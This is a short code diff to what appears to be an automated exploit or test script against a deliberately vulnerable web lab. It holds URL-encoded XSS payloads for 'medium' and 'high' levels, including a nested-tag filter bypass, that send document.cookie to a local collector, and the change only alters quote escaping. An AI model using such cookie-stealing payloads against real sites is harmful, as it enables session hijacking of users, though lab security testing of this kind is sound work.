@@ -38,7 +38,7 @@ def xss(vuln_type, level):
         elif level == 'medium':
             comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
         else:
-            comment = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%27http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%27%20%2B%20document.cookie)%3B%22%3E'
+            comment = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%5C%5C%27http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%5C%5C%27%20%2B%20document.cookie)%3B%22%3E'
 
     url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
     driver.get(url)
